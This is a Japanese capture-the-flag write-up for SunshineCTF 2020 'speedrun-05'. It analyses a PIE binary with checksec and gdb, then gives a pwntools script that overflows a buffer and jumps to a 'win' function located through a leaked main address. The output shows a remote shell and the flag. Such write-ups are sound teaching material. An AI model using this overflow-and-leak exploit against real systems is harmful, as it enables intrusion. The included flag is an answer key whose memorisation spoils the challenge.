# speedrun-05:Speedrun:10pts
nc chal.2020.sunshinectf.org 30005  
[chall_05](chall_05)  

# Solution
ファイルが配られる。  
```bash
$ file chall_05
chall_05: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=948727573434289db5f923a8bcca59c2bc9729cb, not stripped
$ git clone https://github.com/slimm609/checksec.sh.git
~~~
$ ./checksec.sh/checksec --format=csv --file=chall_05
Full RELRO,No Canary found,NX enabled,PIE enabled,No RPATH,No RUNPATH,Symbols,No,0,2,chall_05
$ ./chall_05
Race, life's greatest.
AAAAA
Yes I'm going to win: 0x7fce2300076d
AAAAA
Segmentation fault (コアダンプ)
```
二回の入力があり、BOFがありそうだ。  
PIE enabledであることに注意したい。  
gdbで見てみる。  
```bash
$ gdb chall_05
~~~
gdb-peda$ disass main
Dump of assembler code for function main:
   0x000000000000076d <+0>:     push   rbp
   0x000000000000076e <+1>:     mov    rbp,rsp
   0x0000000000000771 <+4>:     sub    rsp,0x20
   0x0000000000000775 <+8>:     lea    rdi,[rip+0x100]        # 0x87c
   0x000000000000077c <+15>:    call   0x600 <puts@plt>
   0x0000000000000781 <+20>:    mov    rdx,QWORD PTR [rip+0x200888]        # 0x201010 <stdin@@GLIBC_2.2.5>
   0x0000000000000788 <+27>:    lea    rax,[rbp-0x20]
   0x000000000000078c <+31>:    mov    esi,0x13
   0x0000000000000791 <+36>:    mov    rdi,rax
   0x0000000000000794 <+39>:    call   0x630 <fgets@plt>
   0x0000000000000799 <+44>:    mov    eax,0x0
   0x000000000000079e <+49>:    call   0x7a6 <vuln>
   0x00000000000007a3 <+54>:    nop
   0x00000000000007a4 <+55>:    leave
   0x00000000000007a5 <+56>:    ret
End of assembler dump.
gdb-peda$ disass vuln
Dump of assembler code for function vuln:
   0x00000000000007a6 <+0>:     push   rbp
   0x00000000000007a7 <+1>:     mov    rbp,rsp
   0x00000000000007aa <+4>:     sub    rsp,0x240
   0x00000000000007b1 <+11>:    lea    rsi,[rip+0xffffffffffffffb5]        # 0x76d <main>
   0x00000000000007b8 <+18>:    lea    rdi,[rip+0xd4]        # 0x893
   0x00000000000007bf <+25>:    mov    eax,0x0
   0x00000000000007c4 <+30>:    call   0x620 <printf@plt>
   0x00000000000007c9 <+35>:    mov    rdx,QWORD PTR [rip+0x200840]        # 0x201010 <stdin@@GLIBC_2.2.5>
   0x00000000000007d0 <+42>:    lea    rax,[rbp-0x40]
   0x00000000000007d4 <+46>:    mov    esi,0x64
   0x00000000000007d9 <+51>:    mov    rdi,rax
   0x00000000000007dc <+54>:    call   0x630 <fgets@plt>
   0x00000000000007e1 <+59>:    mov    rdx,QWORD PTR [rbp-0x8]
   0x00000000000007e5 <+63>:    mov    eax,0x0
   0x00000000000007ea <+68>:    call   rdx
   0x00000000000007ec <+70>:    nop
   0x00000000000007ed <+71>:    leave
   0x00000000000007ee <+72>:    ret
End of assembler dump.
gdb-peda$ q
```
[speedrun-04](../speedrun-04)と同じくmainからvulnが呼ばれており、`call   rdx`という仕様になっている。  
これによりrdxを呼び出すことができる。  
呼び出し先としてwinなる関数があった。  
```bash
$ objdump -D chall_05
~~~
0000000000000750 <frame_dummy>:
 750:   55                      push   %rbp
 751:   48 89 e5                mov    %rsp,%rbp
 754:   5d                      pop    %rbp
 755:   e9 66 ff ff ff          jmpq   6c0 <register_tm_clones>

000000000000075a <win>:
 75a:   55                      push   %rbp
 75b:   48 89 e5                mov    %rsp,%rbp
 75e:   48 8d 3d 0f 01 00 00    lea    0x10f(%rip),%rdi        # 874 <_IO_stdin_used+0x4>
 765:   e8 a6 fe ff ff          callq  610 <system@plt>
 76a:   90                      nop
 76b:   5d                      pop    %rbp
 76c:   c3                      retq

000000000000076d <main>:
 76d:   55                      push   %rbp
 76e:   48 89 e5                mov    %rsp,%rbp
 771:   48 83 ec 20             sub    $0x20,%rsp
 775:   48 8d 3d 00 01 00 00    lea    0x100(%rip),%rdi        # 87c <_IO_stdin_used+0xc>
~~~
```
gdbなどでパディングを調整し、winに飛ばしたい。  
しかし、PIEによりアドレスがランダムに変更される。  
都合よくmainのアドレスを表示してくれるので、-0x13(0x75a-0x76d)してやればwinのアドレスがわかる。  
以下のpie.pyでそれらを行う。  
```python:pie.py
from pwn import *

elf = ELF('./chall_05')
#io = process(elf.path)
io = remote('chal.2020.sunshinectf.org', 30005)

base = b'A' * 56

io.recvline()
io.sendline()
main_add = io.recvline().replace(b"Yes I'm going to win: 0x", b"").replace(b"\n", b"")
print("main address: 0x{}".format(main_add))
print("win address: 0x{}".format(hex(int(main_add, 16) - 19)))
payload = base + p64(int(main_add, 16) - 19)
io.sendline(payload)
io.interactive()
```
実行する。  
```bash
$ python pie.py
[*] '/chall_05'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to chal.2020.sunshinectf.org on port 30005: Done
main address: 0xb'55907e18b76d'
win address: 0x0x55907e18b75a
[*] Switching to interactive mode
$ ls
chall_05
flag.txt
$ cat flag.txt
sun{chapter-four-9ca97769b74345b1}
```
シェルが得られるので、flag.txtを見るとflagが書かれていた。  

## sun{chapter-four-9ca97769b74345b1}